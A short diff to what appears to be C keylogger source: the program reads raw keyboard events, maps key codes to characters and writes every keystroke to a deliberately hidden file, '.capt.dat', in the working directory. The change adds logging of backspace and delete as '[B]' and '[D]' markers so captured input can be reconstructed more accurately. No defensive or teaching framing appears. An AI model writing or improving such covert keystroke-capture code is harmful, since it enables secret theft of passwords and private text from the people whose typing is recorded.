@@ -24,6 +24,9 @@
 #define KEY_RIGHTSHIFT 54
 #define OUTPUT_FILE ".capt.dat" //file is hidden, saved in active dir
 #define MAX_KEY 127
+#define K_BACKSPACE 14
+#define K_DEL 111
+
 char ascii_map[MAX_KEY + 1] = {
     [2] = '1', [3] = '2', [4] = '3', [5] = '4', [6] = '5', [7] = '6', [8] = '7', [9] = '8', [10] = '9', [11] = '0',
     [12] = '-', [13] = '=', [16] = 'q', [17] = 'w', [18] = 'e', [19] = 'r', [20] = 't', [21] = 'y', [22] = 'u', [23] = 'i', [24] = 'o', [25] = 'p',
@@ -77,7 +80,8 @@ int main() {
 		  shift = true;
   	  if(ev.code == 42 && ev.value == 0) shift = false; 
 	  if(ev.code == 54 && ev.value == 0) shift = false; 
-	    
+	if (ev.code == K_BACKSPACE && ev.value ==1) fprintf(output,"[B]");    
+	if (ev.code == K_DEL && ev.value ==1) fprintf(output,"[D]");    
   	if (ev.code < MAX_KEY) {
 		 if (!shift) ascii = ascii_map[ev.code];
  		   else ascii = shift_map[ev.code];
